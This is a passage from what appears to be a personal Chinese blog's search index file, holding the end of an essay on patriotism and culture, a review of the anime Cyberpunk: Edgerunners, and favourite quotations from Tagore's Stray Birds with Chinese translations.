<h2 id="文化"><a href="#文化" class="headerlink" title="文化"></a>文化</h2><p>文化（英语：culture）是一群共同生活在相同自然环境及经济生产方式的人所形成的一种约定俗成潜意识的外在表现。其中之一的意义是“相互通过学习人类思想与行为的精华来达到完美”；广义的文化包括文字、语言、建筑、饮食、工具、技能、技术、知识、习俗、艺术等。<br>文化非常宽泛，如今有着各种各样的文化，这是特定团体的特色产物。而国家的文化与国家大小人民历史等方面都有着密不可分的联系。<br>每个国家都有自己的文化，或许有的在慢慢衰落，有的在逐渐兴起。可无论如何，只要不是糟粕的那一部分文化，都是值得尊重的。<br>一些所谓的爱国者常常喜欢谈论文化入侵，借此排挤他国文化。<font color=brown>我实在是觉得非常搞笑。首先文化入侵是国家与国家之间才考虑的事，个体喜欢什么是自身的自由。然后，一谈到文化入侵，马上想到的是怎么排挤，而不是怎么更好发展自己国家的文化，自欺欺人。不去想如何竞争，只会发动权力去打压，很低级也很蠢。</font><br>怎样体现出爱文化，其实是一件非常困难的事。因为爱文化不代表不能接受其它国家的文化，爱文化也不代表对自己国家的每种文化都全盘接受。我想，只要对自己国家的好的文化，即便不理解，保持着敬意，带着尊重的心，那便是爱文化。</p>
<h1 id="爱的高下"><a href="#爱的高下" class="headerlink" title="爱的高下"></a>爱的高下</h1><p>在讨论完爱国至少需要爱哪些部分后，接下来便是爱的高下。<br>当国家主动发起战争时，一个爱国的人，他是应当支持还是反对呢？或许有的人会犹豫，但我认为答案很明确，那便是反对。<br>首先，爱国不代表毫无底线。战争是国家之间最糟糕的行为，完全地反人类。难道说因为爱国而杀人就是正确的？可笑之极。<br>其次，爱国应当指出错误而不是容忍。就如一个孩子的成长过程中犯了错，作为父母是应当无所谓，等待酿下大错；还是及时教育避免重复出错呢？答案很明显吧。<br>因此，当一个国家做了错误的事，批判才是正确的行为。而非常可笑的是，有相当多所谓的爱国人士，只会包庇纵容。在我看来，这根本是虚伪的爱国。<br><font color=blue>对人类而言，首先是做人，然后再谈爱国。</font>就像逻辑推理，先有大前提才有小前提。违背良心与道德底线，是违背人的标准。人类都不复存在了更何况国家之事。<br>常常有人说，爱它就去改变它，对它不满就去改变它。可我想说如果一个国家烂到根里了，无论园丁怎么修剪枝叶，无论施加多少肥料，也是毫无意义。满腔热血终会被凉水泼冷，怂恿下火海终将万劫不复，爱国是否值得也有待商榷。<br>小家与大家之间的冲突问题。的确，古人云，皮之不存毛将焉附，覆巢之下安有完卵。面对外敌入侵，人民把国家放在第一位并没有问题。<br>没有外敌入侵时，国家做了不合理的措施，让人民来承担过失，我是坚决不同意的。捍卫自己与自己周边的利益，即便是国家也不能退让。<br><font color=red>做公民，不要做奴隶。<br></font></p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>简单地讨论了以上几点后，我想，可以过滤掉一大部分自称的“爱国人士”。<br>爱国也并非总是位居最高位，当国家的所作所为违背了人类的基本准则，那是应当反对的。<br>当国家的所作所为侵害了个人权益，即便是国家也不应让步（仅限于能够抗议的政府，独裁政府不在此列，保护自身及周边人安全最重要）。</p>
<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>其实想写这么一篇文章，是因周围有人宣称自己爱国，我便思考什么是爱国，算是临时想的，写得并不算好，我自己也不太满意。以后有新的思考再补充吧，权当留个引子。</p>
]]></content>
      <categories>
        <category>随想</category>
      </categories>
      <tags>
        <tag>随想</tag>
        <tag>爱国</tag>
      </tags>
  </entry>
  <entry>
    <title>赛博朋克~边缘行者--渺小个人的癫狂悲剧</title>
    <url>/2022/11/19/%E8%B5%9B%E5%8D%9A%E6%9C%8B%E5%85%8B%E5%8A%A8%E7%94%BB/</url>
    <content><![CDATA[<p><img src="/images/Cyberpunk.png" alt="Cyberpunk"></p>
<span id="more"></span>

<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>Nexflix上九月份一口气播完的，我是等了一段时间，等风评落地才来看的。<br>虽说如此，这部仅有10集的动画我也看了一个月左右。终于今天把最后三集看完了。<br>知道这款游戏，但我没玩也没了解，一无所知没有被剧透来看这部动画，真是一种享受~</p>
<p><img src="/images/Lucy&David2.png" alt="Lucy&amp;David"></p>
<h1 id="色彩"><a href="#色彩" class="headerlink" title="色彩"></a>色彩</h1><p>先来聊聊这个吧，毕竟是能给人最直观感受的方式。<br><font color=Crimson>非常符合我心中对于赛博朋克世界的想象，单凭画面就能让我感受到那股<strong>荒诞离奇</strong>了。对于少有看日本动画的人而言，恐怕很轻易以为这是美国制作的动画吧。不仅如此，这样的画风还带来一个非常有利于动画剧情的好处，对于这样一个动作少不了的动画而言，这样的画风能够提供<strong>足够的张力</strong>。</font>可惜身边只有笔记本这样的小屏幕，如果有够大的屏幕，一定能完美地感受到动画洋溢出来的力量。</p>
<p><img src="/images/Lucy3.png" alt="Lucy"></p>
<h1 id="音乐"><a href="#音乐" class="headerlink" title="音乐"></a>音乐</h1><p>或许因为该游戏制作团队是欧美人，同时游戏设定在美国，动画投资者是Netflix，本作的音乐的确是更为偏向于欧美的风格。<font color=Darkorange>op的氛围倾向于<strong>毁灭</strong>，而ed则是一种<strong>悲剧</strong>的感觉。总之，音乐方面给足了暗示吧。如果说，片头片尾的音乐是符合整部动画气氛，那么最后一集的插曲，就是<strong>侧耳动听之余给人带来无限的悲伤</strong>吧。</font>当然，还有其它插曲，也很符合动画气氛，这里不再一一提起。<br>片头曲：This Fffire<br>片尾曲：Let You Down<br>动画插曲：I Really Want to Stay at Your House</p>
<p><img src="/images/kiss.png" alt="kiss"></p>
<h1 id="剧情"><a href="#剧情" class="headerlink" title="剧情"></a>剧情</h1><p><font color=DarkViolet>相较于传统日本动画，这一部动画仅有10集，这也造就了剧情异常紧凑，恰到好处地略去了那些不用解释观众也能自行领会的部分，各个转场不说浑然天成，也是毫无突兀感。从一开始较快的节奏，作了一点铺垫。慢慢地，剧情一点点加速，再也无法分出一点精力去注意外界杂讯。<strong>精彩绝伦</strong>谓之毫不为过。</font><br><font color=DarkRed>这绝不是好莱坞式爆米花电影，无论是画面音乐还是剧情，都堪称<strong>一流水准</strong>。倘如只是抱着轻松娱乐的心态来看这部动画，也并非不行，但我想恐怕只能收获肤浅简单的想法吧。面对这样一部一年或许仅有一部的短小精悍的动画佳作，岂不是太可惜了吗？</font></p>
<p><img src="/images/Lucy8.png" alt="Lucy"></p>
<h1 id="人物"><a href="#人物" class="headerlink" title="人物"></a>人物</h1><p>各个人物的塑造都十分生动形象，可见制作功底的有力。<br><font color=Magenta>若要问我哪个人物最喜欢，那无疑是<strong>丽贝卡(Rebecca)</strong>，萝莉身材，豪爽作风，平时个性嘻嘻哈哈疯疯癫癫，关键时刻可靠队友毫不含糊。喜欢着大卫(David)，却不因大卫喜欢露西(Lucy)而吃醋，处处关心与照顾大卫，是大卫唯一能托付的人。也因此，最后亚当重锤从天而降将丽贝卡杀害的时候我直接气得锤了桌子一下。老难受了啊！！！一直提心吊胆到最后，结果还是被杀了。亚当重锤，我要杀你一万次也不够！！！</font></p>
<p><img src="/images/Rebecca2.png" alt="Rebecca"></p>
<h1 id="主题"><a href="#主题" class="headerlink" title="主题"></a>主题</h1><font color=orange>
无疑，这是一个极度资本化的世界，只要有钱，服务应有尽有。公安这些在资本面前不值一提，大公司的军事力量甚至能匹敌军队。大卫舍生去对抗公司，连公司的高层都无法触及。这部动画也能给未来的人带来一些警示吧。人的性命化为草芥，没有人在意。当沉浸于动画的时候，没有感觉到。当动画结束后，冷静下来，会发现，这部动画对于生命的处理如此简单以至于不会有人在看动画时缅怀逝去的生命，如大卫的母亲，丽贝卡的哥哥，曼恩(Marine)...或许有人认为是由于动画时长的因素，我想有这方面的因素，但有一个更重要的因素是，让人切身体会到夜之城的生命之轻，人的性命不值一提。
大卫和他周围的同伴是反抗这个资本世界的人，他从底层来，用尽所有生命去反抗这不讲理又无解的世界。他们是有人性的人，所以讲义气，为同伴出生入死。他们是有人性的人，所以大卫杀死一个无辜的母亲会想到自己的母亲。也正因是有人性的人，所以最终会成为赛博精神病。于是，这样的人注定无法战胜冷血无情的公司，即资本。只要有人性就有弱点，从一开始便注定了失败的命运，何等悲哀！即便如此，他们也过了一段足够精彩的人生。书写了独属于他们的传奇。我想，即便再给他们一次机会，依然会做出这样的选择吧。</font>

<p><img src="/images/Lucy4.png" alt="Lucy"></p>
<h1 id="感想"><a href="#感想" class="headerlink" title="感想"></a>感想</h1><p><font color=MidnightBlue>据说，夜之城没有活着的传奇。我见证了大卫这个传奇人物的短暂一生，我见证了大卫与露西的动人恋情，我见证了赛博朋克的义薄云天，我见证了夜之城吃掉了一个又一个梦想…<br>在没看赛博朋克之前，通过零星的言论，我得知这是一部悲剧。我脑海中一直以为会是女主角露西的死去，可结局却是，两人起初在假月球相会，约好一起去月球，最终只有露西一个人去了真月球。而这样一个传奇，最终也被夜之城所吞噬，活在了传说之中。<br>昨晚的感想<strong>普通与特别</strong>，在赛博朋克里也讨论到了。<br>的确，相比于只装了少数小量级义体的人和曼恩他们，大卫是特别的。可是相较于亚当重锤这样几乎全身义体的人而言，大卫所装的沙德威斯坦只是入门级义体，那么大卫也只能算是普通人，承受不住改造金刚的压力。<br>其实普通与特别，只不过是相对之间，同时标准对于不同的人也是不同的，非常主观。我想每个人总有一点在周围人看来特别的部分吧，如果从里到外都是普通的，这样的人恐怕很少见，那其实也算特别吧。因此<strong>没必要纠结于普通或是特别，做自己就是最好</strong>。<br>在这个赛博朋克的世界里，要么堕落至深渊如尸体随处停放，要么过着安分守己的生活一辈子扫清尘土，要么让生命光辉灿烂在一瞬间达到永恒。或许现实世界也是一样，可在这个世界，对比就异常明显了。我们的世界，未来会这样吗？<strong>是否能见证赛博朋克的到来呢？</strong></font></p>
<p><img src="/images/Lucy2.png" alt="Lucy"></p>
<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>过一两年，等剧情都忘得差不多的时候，把赛博朋克游戏买了吧。想必那时候又有全新的体验了，很有趣，不是吗？</p>
<p><img src="/images/Lucy5.png" alt="Lucy"></p>
]]></content>
      <categories>
        <category>动画</category>
        <category>赛博朋克</category>
      </categories>
      <tags>
        <tag>动画</tag>
      </tags>
  </entry>
  <entry>
    <title>飞鸟集--摘抄</title>
    <url>/2022/11/18/%E9%A3%9E%E9%B8%9F%E9%9B%86_%E6%91%98%E6%8A%84/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>最近突然想起了泰戈尔的飞鸟集里的一些诗，来了兴致，便又重读了飞鸟集，不由得感叹，诗真美啊。这样的美，大概是永恒吧。</p>
<span id="more"></span>
<h1 id="喜欢的句子"><a href="#喜欢的句子" class="headerlink" title="喜欢的句子"></a>喜欢的句子</h1><ol>
<li>It is the tears of the earth that keep here smiles in bloom.<br>是大地的泪点，使她的微笑保持着青春不谢。</li>
<li>If you shed tears when you miss the sun, you also miss the stars.<br>如果你因失去了太阳而流泪，那么你也将失去群星了。</li>
<li>Her wishful face haunts my dreams like the rain at night.<br>她的热切的脸，如夜雨似的，搅扰着我的梦魂。</li>
<li>Sorrow is hushed into peace in my heart like the evening among the silent trees.<br>忧思在我的心里平静下去，正如暮色降临在寂静的山林中。</li>
<li>Do not seat your love upon a precipice because it is high.<br>不要因为峭壁是高的，便让你的爱情坐在峭壁上。</li>
<li>What you are you do not see, what you see is your shadow.<br>你看不见你自己，你所看见的只是你的影子。</li>
<li>His own mornings are new surprises to God.<br>神自己的清晨，在他自己看来也是新奇的。</li>
</ol>
<p>未完待续…</p>
<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>曾经听说，所有的作家最初都想成为诗人。<br>诗人，将“美”用文字记录下来，成为了永恒的“美”。<br>让能够理解这样的“美”的人，去跨时代，跨地域，跨文化与诗人产生灵魂的碰撞！</p>
]]></content>
      <categories>
        <category>摘抄</category>
      </categories>
      <tags>
        <tag>诗</tag>
      </tags>
  </entry>
</search>
